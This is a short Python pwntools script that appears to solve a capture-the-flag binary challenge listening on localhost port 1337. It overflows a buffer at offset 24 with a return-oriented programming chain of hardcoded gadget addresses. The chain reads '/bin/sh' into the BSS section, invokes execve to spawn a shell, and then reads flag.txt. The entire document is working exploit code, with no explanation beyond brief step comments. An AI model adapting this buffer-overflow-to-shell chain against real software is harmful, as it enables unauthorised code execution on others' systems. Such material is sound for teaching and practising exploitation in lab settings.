from pwn import *

io = remote('127.0.0.1', 1337)

io.recvuntil(b'secret shutdown command')

OFFSET = 24
XOR_RAX_RAX = 0x0000000000401184
XOR_EAX_EAX = 0x0000000000401185
XOR_EDI_EDI = 0x000000000040118f
POP_RDX = 0x0000000000401182  
POP_R15 = 0x0000000000401196
BSS_ADDR = 0x404200
MOV_RSI_R15 = 0x0000000000401192

POP_RDI = 0x0000000000401197

MOV_EAX_3B = 0x0000000000401188

XOR_R15_R15 = 0x000000000040118e

SYSCALL = 0x0000000000401199
RET = 0x000000000040101a

payload = b'A' * OFFSET

#? 1 - Write /bin/sh\x00 to BSS
payload += p64(RET)
payload += p64(XOR_RAX_RAX)
payload += p64(XOR_EDI_EDI)
payload += p64(POP_RDX)
payload += p64(8) # Read 8 bytes

payload += p64(POP_R15)
payload += p64(BSS_ADDR)
payload += p64(MOV_RSI_R15)
payload += p64(SYSCALL)

#? 2- pop rdi and store the address of the BSS /bin/sh\x00
payload += p64(RET)
payload += p64(POP_RDI)
payload += p64(BSS_ADDR)

#? 3 - Set rax to 0x3b (execve syscall)
payload += p64(XOR_EAX_EAX)
payload += p64(MOV_EAX_3B)

#? 4 - zero out rsi
payload += p64(XOR_R15_R15)
payload += p64(MOV_RSI_R15)

#? 5 - Set rdx to 0
payload += p64(POP_RDX)
payload += p64(0)

#? 6 - Syscall
payload += p64(SYSCALL)

io.sendline(payload)
time.sleep(3)
io.sendline(b'/bin/sh\x00')
time.sleep(1)
io.sendline(b'cat flag.txt')
io.interactive()